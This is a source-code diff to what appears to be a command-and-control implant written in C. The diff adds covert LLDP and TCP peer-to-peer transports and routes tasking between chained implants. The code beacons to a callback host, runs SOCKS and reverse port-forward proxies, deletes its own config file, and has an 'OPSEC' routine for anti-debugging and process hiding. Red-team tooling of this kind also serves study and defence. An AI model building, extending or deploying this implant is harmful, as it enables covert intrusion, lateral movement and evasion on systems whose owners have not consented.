@@ -158,6 +158,9 @@ static void do_get_tasking(void) {
     if (g_state.rpfwd.active) rpfwd_poll();
     if (g_state.socks.active) socks_poll();
     tcp_p2p_poll_links();
+#if !defined(LLDP_TRANSPORT)
+    lldp_p2p_poll_links();
+#endif
 
     packer_t p;
     pk_init(&p);
@@ -212,8 +215,10 @@ static void do_get_tasking(void) {
     }
 
     /* parse delegate messages for P2P links */
+    DBG("beacon: %u bytes remaining after tasks", pr_remaining(&rp));
     while (pr_remaining(&rp) > 0) {
         uint8_t section_action = pr_byte(&rp);
+        DBG("beacon: section_action=0x%02x remaining=%u", section_action, pr_remaining(&rp));
         if (section_action == ACTION_RPFWD_MSG && g_state.rpfwd.active) {
             uint32_t count = pr_int32(&rp);
             for (uint32_t ri = 0; ri < count; ri++) {
@@ -238,15 +243,34 @@ static void do_get_tasking(void) {
                 char *agent_uuid = pr_string(&rp);
                 uint32_t msg_len;
                 const uint8_t *msg_data = pr_bytes(&rp, &msg_len);
+                DBG("delegate: uuid=%s msg_len=%u", agent_uuid ? agent_uuid : "(null)", msg_len);
 
+                int routed = 0;
                 tcp_link_t *link = g_state.tcp_links;
                 while (link) {
                     if (strcmp(link->agent_id, agent_uuid) == 0 && link->connected) {
+                        DBG("delegate: routed to TCP link %s", link->agent_id);
                         tcp_p2p_link_send(link, msg_data, msg_len);
+                        routed = 1;
                         break;
                     }
                     link = link->next;
                 }
+                if (!routed) {
+                    lldp_link_t *llink = g_state.lldp_links;
+                    while (llink) {
+                        DBG("delegate: checking LLDP link %s vs %s", llink->agent_id, agent_uuid);
+                        if (strcmp(llink->agent_id, agent_uuid) == 0 && llink->connected) {
+                            DBG("delegate: routed to LLDP link %s (%u bytes)", llink->agent_id, msg_len);
+                            lldp_p2p_link_send(llink, msg_data, msg_len);
+                            routed = 1;
+                            break;
+                        }
+                        llink = llink->next;
+                    }
+                }
+                if (!routed)
+                    DBG("delegate: NO ROUTE for uuid=%s", agent_uuid);
                 free(agent_uuid);
             }
         } else {
@@ -282,6 +306,7 @@ static void load_config_file(const char *path) {
         else if (strcmp(key, "uri") == 0)        strncpy(g_state.post_uri, val, sizeof(g_state.post_uri) - 1);
         else if (strcmp(key, "sleep") == 0)      g_state.sleep_interval = atoi(val);
         else if (strcmp(key, "jitter") == 0)     g_state.sleep_jitter = atoi(val);
+        else if (strcmp(key, "ssl") == 0)        g_state.use_ssl = atoi(val);
     }
     fclose(fp);
     unlink(path);
@@ -299,6 +324,8 @@ int main(int argc, char **argv) {
     pthread_mutex_init(&g_state.jobs_mutex, NULL);
     g_state.running = 1;
     g_state.tcp_listen_sock = -1;
+    g_state.lldp_sock = -1;
+    g_state.p2p_parent_sock = -1;
 
     strncpy(g_state.uuid, CFG_PAYLOAD_UUID, 39);
     hex_to_bytes(CFG_AES_KEY_HEX, g_state.aes_key, 32);
@@ -307,18 +334,39 @@ int main(int argc, char **argv) {
     strncpy(g_state.post_uri, CFG_POST_URI, sizeof(g_state.post_uri) - 1);
     g_state.sleep_interval = CFG_SLEEP_INTERVAL;
     g_state.sleep_jitter = CFG_SLEEP_JITTER;
-    DBG("config loaded: %s:%d/%s", g_state.callback_host, g_state.callback_port, g_state.post_uri);
+    g_state.use_ssl = CFG_USE_SSL;
+    DBG("config loaded: %s:%d/%s ssl=%d", g_state.callback_host, g_state.callback_port, g_state.post_uri, g_state.use_ssl);
 
     if (argc > 1 && argv[1] && argv[1][0] != '-') {
         load_config_file(argv[1]);
     }
 
-    DBG("ssl_init...");
-    if (ssl_init() != 0) {
-        DBG("ssl_init FAILED");
+#if defined(LLDP_TRANSPORT)
+    DBG("lldp_transport_init...");
+    if (lldp_p2p_child_init() != 0) {
+        DBG("lldp_p2p_child_init FAILED");
         return 1;
     }
-    DBG("ssl_init OK");
+    DBG("lldp transport ready");
+#elif defined(TCP_TRANSPORT)
+    DBG("tcp_transport_init...");
+    if (tcp_p2p_init_listener(CFG_TCP_BIND_PORT) != 0) {
+        DBG("tcp_p2p_init_listener FAILED");
+        return 1;
+    }
+    DBG("tcp transport listening on port %d", CFG_TCP_BIND_PORT);
+#else
+    if (g_state.use_ssl) {
+        DBG("ssl_init...");
+        if (ssl_init() != 0) {
+            DBG("ssl_init FAILED");
+            return 1;
+        }
+        DBG("ssl_init OK");
+    } else {
+        DBG("plain HTTP mode, skipping ssl_init");
+    }
+#endif
 
     /* OPSEC: anti-debug, process hiding, environ scrub */
     DBG("opsec_init...");
@@ -338,6 +386,16 @@ int main(int argc, char **argv) {
 #endif
 
     srand((unsigned int)(time(NULL) ^ getpid()));
+
+#if defined(TCP_TRANSPORT)
+    /* wait for the egress parent to connect before we can beacon */
+    DBG("tcp_p2p: waiting for parent connection...");
+    while (g_state.running) {
+        if (tcp_p2p_child_accept()) break;
+        usleep(100000);
+    }
+    DBG("tcp_p2p: parent connected, starting checkin");
+#endif
 
     while (g_state.running) {
         if (do_checkin() == 0) break;
@@ -369,7 +427,9 @@ int main(int argc, char **argv) {
 
     if (g_state.rsp_len > 0) do_get_tasking();
 
+    if (g_state.p2p_parent_sock >= 0) { close(g_state.p2p_parent_sock); g_state.p2p_parent_sock = -1; }
     tcp_p2p_destroy();
+    lldp_p2p_destroy();
     if (g_state.rpfwd.active) rpfwd_destroy();
     if (g_state.socks.active) socks_destroy();
     if (g_state.ssl_ctx) SSL_CTX_free(g_state.ssl_ctx);
